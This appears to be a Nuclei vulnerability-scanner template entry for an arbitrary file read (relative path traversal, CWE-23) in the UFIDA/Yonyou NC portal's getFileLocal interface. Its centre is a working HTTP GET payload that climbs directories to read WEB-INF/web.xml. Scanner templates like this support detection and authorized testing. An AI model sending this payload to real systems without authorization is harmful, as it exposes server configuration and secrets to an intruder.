# Nuclei Template: UFIDA NC Portal - Arbitrary File Read
**Template ID:** yonyou-ufida-nc-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`yonyou-ufida-nc-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is any file reading in the getFileLocal interface of UFIDA Mobile System Management.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
```

## References
- https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B%E7%A7%BB%E5%8A%A8%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86getFileLocal%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
